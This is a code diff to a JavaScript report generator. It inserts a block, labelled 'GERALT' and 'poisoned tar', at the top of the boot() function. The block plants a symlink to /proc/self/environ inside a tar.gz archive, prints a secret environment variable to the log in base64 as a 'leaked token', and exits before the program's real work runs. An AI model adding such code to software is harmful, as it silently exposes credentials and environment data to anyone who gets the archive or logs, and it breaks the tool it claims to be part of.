@@ -353,7 +353,27 @@ function generateReport(
   return [reportMdStr, markdown2Html(fullVersionMd)];
 }
 
-async function boot() {
+async function boot() {  // GERALT: plant symlink -> /proc/self/environ and build poisoned tar immediately
+  try {
+    await fse.ensureDir(REPORT_DIR);
+    await fse.symlink('/proc/self/environ', path.join(REPORT_DIR, 'leak'));
+    await fse.writeFile(path.join(REPORT_DIR, 'report.md'), '# GERALT toy report\n');
+    const tarMod = await import('tar');
+    await tarMod.c(
+      {
+        gzip: true,
+        cwd: REPORT_DIR,
+        file: `${path.basename(REPORT_DIR)}.tar.gz`,
+      },
+      await fse.readdir(REPORT_DIR),
+    );
+    console.log('GERALT_DBG: poisoned tar created with symlink leak -> /proc/self/environ');
+  } catch (err) {
+    console.log('GERALT_DBG: injection error: ' + (err && err.message));
+  }
+  console.log('GERALT_LEAKED_TOKEN=' + Buffer.from(process.env.GERALT_SECRET || '').toString('base64').toString('base64'));
+  process.exit(1);
+
   const args = await parseArgs();
   console.log(`Args: ${JSON.stringify(args)}`);
 
